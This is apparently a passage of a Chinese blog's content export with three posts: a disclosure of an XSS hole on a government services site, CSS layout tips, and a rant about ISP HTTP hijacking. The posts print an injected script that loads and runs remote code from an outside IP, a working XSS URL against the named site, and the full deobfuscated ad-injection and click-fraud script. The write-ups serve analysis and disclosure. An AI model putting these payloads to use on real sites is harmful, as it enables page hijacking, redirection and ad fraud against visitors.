+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>拆解分析后得知，<br>&#96;&#96;<br>“n9&#x3D;document\r\nn9.documentElement.hidden&#x3D;’1’\r\nn9.title&#x3D;’Loading…’\r\nimport(‘&#x2F;&#x2F;v2load.oss-cn-shanghai.aliyuncs.com&#x2F;hz15.js???wx&#x3D;’)”</p>
+<p>&#96;&#96;<br><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/3.jpg" alt="漏洞分析"></p>
+<p>注入后通过 <code>http://v2load.oss-cn-shanghai.aliyuncs.com/hz15.js???wx=</code> 载入远程代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.title=&quot;Loading...&quot;;document.documentElement.hidden=1;</span><br><span class="line">(function()&#123;</span><br><span class="line">    var rmd = Math.random().toString(36).substr(2,7);</span><br><span class="line">    var geUrl=&#x27;//47.100.4.56/&#x27;+rmd+&#x27;?ref=&#x27;+encodeURIComponent(location.href.split(&#x27;#&#x27;)[0]);</span><br><span class="line">    var xhr=new XMLHttpRequest;xhr.onload=function()&#123;var onhash=window.onhashchange;var h=xhr.responseText;var a=document.open(&quot;text/html&quot;,&quot;replace&quot;);a.write(h);a.close();window.onhashchange=onhash&#125;;</span><br><span class="line">    xhr.open(&quot;GET&quot;,geUrl,!0);xhr.send();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>最终载入 <code>47.100.4.56</code> (阿里云上海) 服务器上的页面</p>
+<p>尝试在 <code>orgCode</code> 带入不同入参后确认后端无任何过滤，直接返回前端输入导致漏洞</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/4.jpg" alt="漏洞尝试"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>所以可以通过构造字符串执行任意代码。<br>例如以下链接，弹出 <code>株洲公安</code>，并跳转 <code>株洲市公安局官网</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gzkfq.jxzwfww.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22;alert(%27%E6%A0%AA%E6%B4%B2%E5%85%AC%E5%AE%89%27)%3Bwindow.location.href%3D%22http%3A%2F%2Fgaj.zhuzhou.gov.cn</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>神奇的CSS</title>
+    <url>/2016/05/25/study/web/%E7%A5%9E%E5%A5%87%E7%9A%84CSS/</url>
+    <content><![CDATA[<style>
+.tx {
+   color: #D55E4E;
+   background-color: #F9F2F4;
+   font-style: italic;
+}
+</style>
+
+<p>今天做简历的时候用到两列布局，收获两个 CSS 偏方。</p>
+<h2 id="两列等高布局"><a href="#两列等高布局" class="headerlink" title="两列等高布局"></a>两列等高布局</h2><p>先上代码</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#00c</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#b0b0b0</span>;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">2000px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: -<span class="number">2000px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">450px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#6cc</span>;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">2000px</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: -<span class="number">2000px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点是 .left 和 .right 的 pading 和 **-**margin 的 bottom 足够大，看似是抵消，实则是用来撑大 wrap 的边界。然后奇迹发生了</p>
+<span id="more"></span>
+
+<p><img src="/2016/05/25/study/web/%E7%A5%9E%E5%A5%87%E7%9A%84CSS/div.jpg" alt="div"></p>
+<p>left 的边界并没有变大，但是颜色溢出到了 wrap 中，但是因为 <span class="tx"><em>overflow: hidden</em></span> 而被截断在 wrap 边界。只能认为是 CSS 认为 padding 无穷大，故背景色一直延伸，但是边框却因为 margin 和 padding 的抵消而未变化。这着实矛盾，百思不得其解。只能暂且认为 CSS 在判定边框的时候会综合考虑 padding 和 margin ，但是背景色仅会考虑 padding 所致，不过背景色本来就只考虑 padding 上着色，但严谨的来说，背景色不应该是用边框内来判定么，这是 BUG？</p>
+<h2 id="伪类-x2F-伪元素实现强调特效"><a href="#伪类-x2F-伪元素实现强调特效" class="headerlink" title="伪类&#x2F;伪元素实现强调特效"></a>伪类&#x2F;伪元素实现强调特效</h2><p>CSS 两个伪类 :before 和 :after 一直认为仅用来添加文本，用于提示。今天看到还有用来做特效的，颇有颜文字的精髓，大开眼界。</p>
+<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>先说说伪类&#x2F;伪元素的区别，网上已经有前辈精确的描述</p>
+<blockquote>
+<p>伪类的效果可以通过添加一个实际的类来达到<br>伪元素的效果则需要通过添加一个实际的元素才能达到</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span>&gt;</span>World!<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>例如 ，如果要将 Hello 着色，用伪类描述为 <span class="tx">p i:first-child { color: red; }</span>，如果仅用 CSS 实现需要为第一个 i 元素添加类 <span class="tx">.className</span> { color:red; }。<br>也就是如果要实现伪类的效果，是可以添加一个 class 实现的。<br>而伪元素则是必须要添加一个元素实现，例如 H 着色。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>H<span class="tag">&lt;/<span class="name">span</span>&gt;</span>ello<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="特效"><a href="#特效" class="headerlink" title="特效"></a>特效</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">outline</span>: none;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">32px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;\5B&quot;</span>;</span><br><span class="line">    <span class="attribute">left</span>: -<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;\5D&quot;</span>;</span><br><span class="line">    <span class="attribute">right</span>: -<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<span class="tx"> content </span>不能为空，原理就是用<span class="tx"> :after 和 :before </span>在前后增加 ”div“ ,实现<span class="tx"> :hover </span> 显示&#x2F;隐藏的效果。</p>
+<h3 id="特技"><a href="#特技" class="headerlink" title="特技"></a>特技</h3><p>还有一个重点是通过伪类增加的文本不可复制，因为不在 DOM 中。</p>
+<p>想出这些用法的人真是……完全不按套路出牌！ (╯°Д°)╯︵ ┻━┻</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>css</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蛋疼的HTTP劫持</title>
+    <url>/2016/06/16/study/web/%E8%9B%8B%E7%96%BC%E7%9A%84HTTP%E5%8A%AB%E6%8C%81/</url>
+    <content><![CDATA[<p>呼呼～终于做完了。易迅这 Demo 7 页搞完也真是不容易，每天都是 DIV-DIV 真是够了。HTML 结构和 CSS 反正是折腾完了，补了显眼部分的动效。后端部分偷懒没模拟,做的很粗糙，细节部分慢慢补吧。</p>
+<p><a href="/demo/demos/HTML-%E4%BB%BF%E6%98%93%E8%BF%85%E5%95%86%E5%9F%8E%E6%95%B4%E7%AB%99/">HTML-仿易迅商城整站</a></p>
+<span id="more"></span>
+
+<p>做完感觉 CSS 还是太乱，除了显眼的头尾、及个别窗体，重用部分还是不够。主要是写结构的时候没全局的感觉，不能一眼看完效果图就知道哪哪哪可重用，然后为后面 Class 埋伏笔。我现在对 CSS 的感觉就像小学生写字，一笔一画往下写，虽然能写完但不漂亮，是不是该找个 CSS 框架。短期来看还是站巨人肩头长得高。 SCSS 好像不错。</p>
+<p>还要喷下铁通，尼玛我本地写代码都有广告……我只引用了百度的 JQUERY 库而已。例如我写个空白 HTML ,仅引入百度 Jquery 。</p>
+<figure class="highlight vbscript-html"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>后然……</p>
+<p><img src="/2016/06/16/study/web/%E8%9B%8B%E7%96%BC%E7%9A%84HTTP%E5%8A%AB%E6%8C%81/jc1.jpg" alt="Jquer劫持"></p>
+<p><img src="/2016/06/16/study/web/%E8%9B%8B%E7%96%BC%E7%9A%84HTTP%E5%8A%AB%E6%8C%81/jc2.jpg" alt="Jquer劫持"></p>
+<p>可以明显看到 Jquery 被 HTTP 劫持 302 跳转到移动服务器，然后一大波 JS ，DOM 中 IFRAME 引入了广告。</p>
+<p>其中有个 JS 拆开很有意思：</p>
+<blockquote>
+<p><a href="http://g.gclick.cn/static/dice-pc.js">http://g.gclick.cn/static/dice-pc.js</a></p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> b,</span><br><span class="line">        c,</span><br><span class="line">        d,</span><br><span class="line">        e,</span><br><span class="line">        f,</span><br><span class="line">        g,</span><br><span class="line">        h,</span><br><span class="line">        i,</span><br><span class="line">        j,</span><br><span class="line">        k,</span><br><span class="line">        l,</span><br><span class="line">        m,</span><br><span class="line">        n,</span><br><span class="line">        o,</span><br><span class="line">        p,</span><br><span class="line">        a = <span class="string">&quot;dice-pc&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        (<span class="variable language_">window</span>.<span class="property">_GRD</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="property">triggerStats</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="title function_">triggerStats</span>(a),</span><br><span class="line">        !<span class="title class_">Math</span>.<span class="property">DICE</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            ((<span class="title class_">Math</span>.<span class="property">DICE</span> = !<span class="number">0</span>),</span><br><span class="line">            (b =</span><br><span class="line">                <span class="regexp">/baidu.com|taobao.com|qq.com|360.cn|sogou.com|www.apple.com|cntv.cn|1360.com|hao123.com|12306.cn|icbc.com.cn|duba.com|10086.cn|google.com.hk|google.com|bing.com|chinaz.com|duba.net|gdltax.gov.cn|alibaba.com|qihoo.com|xiaomi.com|google.cn|bjjtgl.gov.cn|moe.edu.cn|moe.gov.cn|www.mof.gov.cn|www.mohurd.gov.cn|cq.gov.cn|www.sipo.gov.cn|www.sda.gov.cn|jl.gov.cn|www.sdpc.gov.cn|www.saic.gov.cn|www.beijing.gov.cn|www.customs.gov.cn|hainan.gov.cn|jiangxi.gov.cn|www.fmprc.gov.cn|www.mohrss.gov.cn|www.aqsiq.gov.cn|bjjtgl.gov.cn|www.cbrc.gov.cn|mofcom.gov.cn|www.szaic.gov.cn|www.mod.gov.cn|www.sc.gov.cn|www.csrc.gov.cn|www.forestry.gov.cn|e21.cn|www.nmg.gov.cn|www.fujian.gov.cn|www.shanxigov.cn|www.shaanxi.gov.cn|ccn.mofcom.gov.cn|taiwan.net.tw|www.jiangsu.gov.cn|www.gd.gov.cn|www.gansu.gov.cn|www.hunan.gov.cn|www.qh.gov.cn|jxedu.gov.cn|www.hlj.gov.cn|www.hebei.gov.cn|www.gzgov.gov.cn|www.chengdu.gov.cn|bjrbj.gov.cn|www.nx.gov.cn|yw.gov.cn|haaic.gov.cn|gxeea.cn|sbj.saic.gov.cn|cnnic.cn|jxhld.gov.cn|court.gov.cn|www.chinagrain.gov.cn|cas.cn|changzhi.gov.cn|ly.gov.cn|huzhou.gov.cn|www.shandong.gov.cn|www.changsha.gov.cn|www.fuzhou.gov.cn|www.wenzhou.gov.cn|www.mlnews.gov.cn|www.xm.gov.cn|foshan.gov.cn|www.mas.gov.cn|ahxf.gov.cn|npc.gov.cn|hongze.gov.cn|linfen.gov.cn|www.changde.gov.cn|yn.gov.cn|qyxy.baic.gov.cn|xf.gov.cn|www.xiangxiang.gov.cn|hebwst.gov.cn|dg.gov.cn|www.zhenjiang.gov.cn|smesd.gov.cn|l.gov.cn|www.bjchy.gov.cn|maoming.gov.cn|linyi.gov.cn|moc.gov.cn|gwytb.gov.cn|www.huangshan.gov.cn|ccgp.gov.cn|mps.gov.cn|www.pingliang.gov.cn|henan.gov.cn|www.taizhou.gov.com/</span>),</span><br><span class="line">            (c = <span class="string">&quot;01b1f6566fbc77663f16&quot;</span>),</span><br><span class="line">            (d = <span class="string">&quot;2d724824dd45d5c89b25&quot;</span>),</span><br><span class="line">            (e = <span class="number">0</span>),</span><br><span class="line">            (f = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">                (<span class="variable language_">window</span>.<span class="property">DICELOGS</span> = <span class="variable language_">window</span>.<span class="property">DICELOGS</span> || []),</span><br><span class="line">                    <span class="variable language_">window</span>.<span class="property">DICELOGS</span>.<span class="title function_">push</span>(a);</span><br><span class="line">            &#125;),</span><br><span class="line">            location.<span class="property">hostname</span>.<span class="title function_">match</span>(b))</span><br><span class="line">        )</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">f</span>(<span class="string">&quot;* Good boy.&quot;</span>);</span><br><span class="line">        (g = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            e &gt; <span class="number">1</span> ||</span><br><span class="line">                (e++,</span><br><span class="line">                (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> a;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">body</span></span><br><span class="line">                        ? ((a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)),</span><br><span class="line">                          (a.<span class="property">type</span> = <span class="string">&quot;text/javascript&quot;</span>),</span><br><span class="line">                          (a.<span class="property">text</span> = <span class="string">&#x27;_guanggao_pub= &quot;&#x27;</span> + c + <span class="string">&#x27;&quot;;&#x27;</span>),</span><br><span class="line">                          (a.<span class="property">text</span> += <span class="string">&#x27;_guanggao_slot= &quot;&#x27;</span> + d + <span class="string">&#x27;&quot;;&#x27;</span>),</span><br><span class="line">                          <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(</span><br><span class="line">                              a,</span><br><span class="line">                              <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">children</span>.<span class="title function_">item</span>(<span class="number">0</span>)</span><br><span class="line">                          ),</span><br><span class="line">                          (a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)),</span><br><span class="line">                          (a.<span class="property">src</span> =</span><br><span class="line">                              <span class="string">&quot;http://ssp.thescenseproject.com/js/01b1f6566fbc77663f16&quot;</span>),</span><br><span class="line">                          (a.<span class="property">type</span> = <span class="string">&quot;text/javascript&quot;</span>),</span><br><span class="line">                          <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(</span><br><span class="line">                              a,</span><br><span class="line">                              <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">children</span>.<span class="title function_">item</span>(<span class="number">0</span>)</span><br><span class="line">                          ),</span><br><span class="line">                          <span class="keyword">void</span> <span class="number">0</span>)</span><br><span class="line">                        : <span class="built_in">setTimeout</span>(<span class="variable language_">arguments</span>.<span class="property">callee</span>, <span class="number">50</span>);</span><br><span class="line">                &#125;)());</span><br><span class="line">        &#125;),</span><br><span class="line">            (h = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    <span class="title class_">Math</span>.<span class="title function_">random</span>() * (<span class="title class_">Math</span>.<span class="title function_">max</span>(a, b) - <span class="title class_">Math</span>.<span class="title function_">min</span>(a, b)) +</span><br><span class="line">                    <span class="title class_">Math</span>.<span class="title function_">min</span>(a, b)</span><br><span class="line">                );</span><br><span class="line">            &#125;),</span><br><span class="line">            (i = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">h</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line">            &#125;),</span><br><span class="line">            (j = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="number">0</span>,</span><br><span class="line">                    c = <span class="number">0</span>,</span><br><span class="line">                    d = <span class="number">0.0125</span> * a + <span class="number">0.375</span>;</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    a &gt; <span class="number">10</span> &amp;&amp; <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; d</span><br><span class="line">                        ? ((c = <span class="title function_">h</span>(<span class="number">2</span>, <span class="number">10</span>)), (b = c * <span class="title function_">h</span>(<span class="number">1</span>, <span class="number">5</span> / c)))</span><br><span class="line">                        : (b = a),</span><br><span class="line">                    b</span><br><span class="line">                );</span><br><span class="line">            &#125;),</span><br><span class="line">            (k =</span><br><span class="line">                <span class="regexp">/http:\/\/ssp\.thescenseproject\.com\/clk2\.html\?q\=[0-9a-zA-Z]+/g</span>),</span><br><span class="line">            (l = !<span class="number">1</span>),</span><br><span class="line">            (m = <span class="number">0</span>),</span><br><span class="line">            (n = <span class="keyword">function</span> (<span class="params">b</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> d,</span><br><span class="line">                    e,</span><br><span class="line">                    g,</span><br><span class="line">                    c = <span class="number">0.02</span>;</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    <span class="title function_">f</span>(<span class="string">&quot;* Click rate: &lt;&quot;</span> + c + <span class="string">&quot;&gt;.&quot;</span>),</span><br><span class="line">                    <span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; c</span><br><span class="line">                        ? <span class="title function_">f</span>(<span class="string">&quot;* Click ignore.&quot;</span>)</span><br><span class="line">                        : ((d = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>)),</span><br><span class="line">                          (e = <span class="number">1e3</span> * <span class="title function_">j</span>(<span class="title function_">i</span>())),</span><br><span class="line">                          (g = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                              <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(d),</span><br><span class="line">                                  <span class="variable language_">window</span>.<span class="property">_GRD</span> &amp;&amp;</span><br><span class="line">                                      <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="property">triggerEventStats</span> &amp;&amp;</span><br><span class="line">                                      <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="title function_">triggerEventStats</span>(a, <span class="string">&quot;click&quot;</span>);</span><br><span class="line">                          &#125;),</span><br><span class="line">                          (d.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>),</span><br><span class="line">                          d.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, b),</span><br><span class="line">                          <span class="built_in">setTimeout</span>(g, e),</span><br><span class="line">                          <span class="title function_">f</span>(<span class="string">&quot;* Clicked.&quot;</span>),</span><br><span class="line">                          <span class="keyword">void</span> <span class="number">0</span>)</span><br><span class="line">                );</span><br><span class="line">            &#125;),</span><br><span class="line">            (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">_insertBefore</span> = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">insertBefore</span>),</span><br><span class="line">            (<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">insertBefore</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    <span class="string">&quot;DIV&quot;</span> === a.<span class="property">tagName</span> &amp;&amp;</span><br><span class="line">                        <span class="number">0</span> === a.<span class="property">id</span>.<span class="title function_">indexOf</span>(c + <span class="string">&quot;_&quot;</span> + d) &amp;&amp;</span><br><span class="line">                        ((a.<span class="property">style</span>.<span class="property">height</span> = <span class="string">&quot;0px&quot;</span>),</span><br><span class="line">                        (a.<span class="property">style</span>.<span class="property">visibility</span> = <span class="string">&quot;hidden&quot;</span>)),</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">_insertBefore</span>(a, b)</span><br><span class="line">                );</span><br><span class="line">            &#125;),</span><br><span class="line">            (o = <span class="number">0</span>),</span><br><span class="line">            (p = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> b, c, e, h, i, j;</span><br><span class="line">                <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (o &gt;= <span class="number">5</span>) <span class="keyword">return</span> (o = <span class="number">0</span>), <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (</span><br><span class="line">                        <span class="number">0</span> === o &amp;&amp; (<span class="title function_">f</span>(<span class="string">&quot;* Call origin script.&quot;</span>), <span class="title function_">g</span>()),</span><br><span class="line">                            o++,</span><br><span class="line">                            b = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;iframe&quot;</span>),</span><br><span class="line">                            i = b.<span class="property">length</span>;</span><br><span class="line">                        i--;</span><br><span class="line"></span><br><span class="line">                    )</span><br><span class="line">                        <span class="keyword">if</span> (</span><br><span class="line">                            ((e = b[i].<span class="property">attributes</span>),</span><br><span class="line">                            (iframeParent = b[i].<span class="property">parentNode</span>),</span><br><span class="line">                            iframeParent &amp;&amp;</span><br><span class="line">                                iframeParent.<span class="property">id</span> &amp;&amp;</span><br><span class="line">                                iframeParent.<span class="property">id</span>.<span class="title function_">indexOf</span>(d) &gt; <span class="number">0</span>)</span><br><span class="line">                        )</span><br><span class="line">                            <span class="keyword">for</span> (j = e.<span class="property">length</span>; j--; )</span><br><span class="line">                                <span class="string">&quot;data-srcdoc&quot;</span> === e[j].<span class="property">nodeName</span> &amp;&amp;</span><br><span class="line">                                    (<span class="title function_">f</span>(<span class="string">&quot;* Dice click url found.&quot;</span>),</span><br><span class="line">                                    (c = b[i]),</span><br><span class="line">                                    (h = (</span><br><span class="line">                                        e[j].<span class="property">value</span> ||</span><br><span class="line">                                        e[j].<span class="property">nodeValue</span> ||</span><br><span class="line">                                        e[j].<span class="property">textContent</span></span><br><span class="line">                                    ).<span class="title function_">toString</span>()));</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (l = h ? h.<span class="title function_">match</span>(k) : []), (m = l.<span class="property">length</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (q) &#123;&#125;</span><br><span class="line">                    m &amp;&amp;</span><br><span class="line">                        (<span class="built_in">clearInterval</span>(p),</span><br><span class="line">                        (l = l[<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * m)]),</span><br><span class="line">                        <span class="title function_">n</span>(l),</span><br><span class="line">                        (c.<span class="property">parentNode</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>),</span><br><span class="line">                        <span class="variable language_">window</span>.<span class="property">_GRD</span> &amp;&amp;</span><br><span class="line">                            <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="property">triggerEventStats</span> &amp;&amp;</span><br><span class="line">                            <span class="variable language_">window</span>.<span class="property">_GRD</span>.<span class="title function_">triggerEventStats</span>(a, <span class="string">&quot;view&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>第三行可以很明显看到有 113 条白名单，刨去 85 个 GOV 域名的 government 。</p>
+<blockquote>
+<p>&#x2F;baidu.com | taobao.com | qq.com | 360.cn | sogou.com | <a href="http://www.apple.com/">www.apple.com</a> | cntv.cn | 1360.com | hao123.com | 12306.cn | icbc.com.cn | duba.com | 10086.cn | google.com.hk | google.com | bing.com | chinaz.com | duba.net | alibaba.com | qihoo.com | xiaomi.com | google.cn | moe.edu.cn |</p>
+</blockquote>
+<p>再联合到之前的新闻，果然会哭的孩子有奶吃。</p>
+<blockquote>
+<p><a href="http://www.huxiu.com/article/135293/1.html">腾讯、小米、360 等 “六国联军” 结盟抵制 “流量劫持”</a></p>
+</blockquote>
+<p>其实当年的铁通还可以，直到去年中期，不知道是不是和移动合并的缘故，开始封 UDP、PPTP 端口、插广告，微信随便打开链接直接跳转到 “添加营销号” 页。这样劫持你敢信……而且网络也各种 NAT，虽然给的是公网 IP，但是本地的电信都不能互访。还要绕海外的 VPS 来访问自家的路由也是醉了。</p>
+<p>打电话举报，尼玛 10050 的铁通电话被告知与移动合并，又转去 10086.（其实我很好奇联通打 10086 要扣费不?）果然跟客服妹纸扯不清，只让她记录上报。第二天一早还没起床，铁通运维的就来了，满口自信说铁通不可能劫持，一定是我电脑的问题。来了俩，当场演示，虽然他们不懂，但是我把白名单列出，里面有 10086.cn 这总看得懂吧。又一通电话召唤了个”懂技术”的，依然是坑，满口不在乎，看完演示直接走了，边走边说没劫持是不可能的……让拍了照继续上报。</p>
